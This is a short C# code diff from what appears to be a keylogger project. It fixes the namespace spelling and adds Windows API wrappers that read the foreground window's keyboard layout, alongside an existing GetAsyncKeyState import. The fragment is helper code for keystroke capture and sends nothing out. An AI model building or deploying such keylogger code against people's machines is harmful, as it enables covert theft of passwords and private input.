@@ -5,7 +5,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
 
-namespace keyloger
+namespace keylogger
 {
     public static class WinApiWrapper
     {
@@ -34,5 +34,28 @@ namespace keyloger
 
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
+
+
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern int GetWindowThreadProcessId(
+            [In] IntPtr hWnd,
+            [Out, Optional] IntPtr lpdwProcessId
+            );
+
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern ushort GetKeyboardLayout(
+            [In] int idThread
+            );
+
+        /// <summary>
+        /// Вернёт Id раскладки.
+        /// </summary>
+        public static ushort GetKeyboardLayout()
+        {
+            return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
+        }
     }
 }
